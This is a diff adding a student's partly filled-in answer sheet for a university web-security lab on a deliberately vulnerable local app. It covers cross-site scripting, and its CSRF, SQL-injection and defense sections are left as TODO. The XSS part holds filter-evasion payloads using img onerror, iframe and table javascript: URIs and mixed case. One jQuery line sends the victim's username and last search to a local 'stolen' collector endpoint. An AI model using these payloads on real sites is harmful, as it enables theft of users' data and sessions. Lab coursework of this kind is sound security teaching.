@@ -1,0 +1,168 @@
+COSC 311 Assignment #3: Web Security
+
+Due Date: 10/22/21 at 5:00pm ET
+
+You may work with a partner on this assignment. 
+Only one person partnership needs to submit.
+
+Reminder: You may NOT work with the same partner on multiple assignments. 
+
+
+NAMES: Mia McDuffie
+
+________________________________________________________________________________________
+
+Part 1: Cross-site Scripting (35%)
+
+	1.0) Payload (JavaScript/jQuery):
+
+		In the search bar, you can put some JavaScript code within a text 
+		field so that some action is performed. An example of this is:
+		<script>alert("Hello! I am an alert box! -- O Defence");</script>
+
+		This would show an alert once the button is push and a get command is done.
+
+
+	1.0) No defense
+
+		http://0.0.0.0:8080/search?xssdefense=0&q=TODO
+
+		http://0.0.0.0:8080/search?q=%3Cscript%3Ealert%28%22Hello%21+I+am+an+alert+box%21+--+O+Defence%22%29%3B%3C%2Fscript%3E
+		
+		http://localhost:31337/stolen?user=USERNAME&last_search=LAST_SEARCH
+
+		<script>http://localhost:31337/stolen?user=USERNAME&last_search=LAST_SEARCH;</script>
+
+		<script> $.get( "http://localhost:31337/stolen?user=USERNAME&last_search=LAST_SEARCH", function( data ) { alert( "Data Loaded: " + data );}); </script>
+
+	1.1) Remove "script"
+
+		http://0.0.0.0:8080/search?xssdefense=1&q=TODO
+
+		For this one, you can use other tags besides the script tag to do
+		malicious code. For example, in an input field you can type 
+		<img src='#'onerror=alert(1)/> to display an alert. This code utilizes
+		an img to display an alert. The url to so this would be:
+
+		http://0.0.0.0:8080/search?xssdefense=1&q=%3Cimg+src%3D%27%23%27+onerror%3Dalert%281%29+%2F%3E
+
+		This url utilizes HTML URL Encoding so that any converts characters into a valid ASCII format.
+
+		Another example:
+		<p> <a href="" onclick="alert('I excuted JavaScript!');">Click me to see the JavaScript work!</a> </p>
+		<img src='#'onerror=alert(1)/>
+
+
+	1.2) Remove several tags 
+
+		http://0.0.0.0:8080/search?xssdefense=2&q=TODO
+
+		http://0.0.0.0:8080/search?q=%3Ciframe+src%3D%22https%3A%2F%2Fbongo.cat%2F%22%3E
+		<iframe src="https://bongo.cat/">
+
+		http://0.0.0.0:8080/search?q=%3Ctable+background%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E
+		<table background="javascript:alert('XSS')">
+
+
+	1.3) Remove " ' and ;
+
+		http://0.0.0.0:8080/search?xssdefense=3&q=TODO
+
+		http://0.0.0.0:8080/search?q=%3Ciframe+SRC%3DJaVaScRiPt%3Aalert%28%29%3E
+		<iframe SRC=JaVaScRiPt:alert()>
+
+		http://0.0.0.0:8080/search?q=%3CA+HREF%3Dhttp%3A%2F%2Fgoogle.com%2F%3Elink%3C%2FA%3E
+		<A HREF=http://google.com/>link</A>
+		
+
+
+	1.4) [Optional extra credit] Encode < and >
+
+		http://0.0.0.0:8080/search?xssdefense=4&q=TODO
+
+
+________________________________________________________________________________________
+
+Part 2: Cross-site Request Forgery (20%)
+
+	2.0) No defense. Target URL: http://0.0.0.0:8080/login?csrfdefense=0&xssdefense=4
+
+		<html>
+			TODO
+		</html>
+
+
+	2.1) Token validation (with XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=1&xssdefense=0
+
+		<html>
+			TODO
+		</html>
+
+
+	2.2) [Optional extra credit] Token validation (without XSS). Target URL: http://0.0.0.0:8080/login?csrfdefense=&xssdefense=4
+
+		<html>
+			TODO
+		</html>
+
+
+________________________________________________________________________________________
+
+
+Part 3: SQL Injection (10%)
+
+	Username: TODO
+	Password: TODO
+
+
+________________________________________________________________________________________
+
+
+Part 4: Better Defenses (35%)
+
+	4.0) bungle_secure.zip (uploaded to Gradescope separately) 	
+
+
+	4.1) Briefly describe how you implemented password salting and hashing 
+
+		TODO
+		
+
+	4.2) Briefly describe the changes you made to database.py to prevent SQL injection attacks
+
+		TODO
+
+
+	4.3) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
+	     strengthen Bungle!'s defenses to prevent XSS attacks
+
+		TODO
+
+
+	4.4) In 1-2 paragraphs, provide some advice to the Bunglers about how they should 
+	     strengthen Bungle!'s defenses to prevent CSRF attacks
+
+	     	TODO
+
+
+________________________________________________________________________________________
+
+
+Additional Questions
+
+	Q1 (ungraded). How did you divide the work between partners? (Put N/A if worked alone)
+
+		[Your answer here]
+
+
+	Q2 (optional, ungraded). Did you use code snippets from anywhere online that you need to cite?
+
+		https://www.w3schools.com/tags/ref_urlencode.ASP
+		https://www.veracode.com/security/xss
+		https://www.codegrepper.com/code-examples/javascript/xss+attack+without+script+tag
+		https://www.acunetix.com/websitesecurity/cross-site-scripting/
+
+
+	Q3 (optional, ungraded). Do you have any suggestions for improving this assignment in the future?
+
+		[Your answer here]
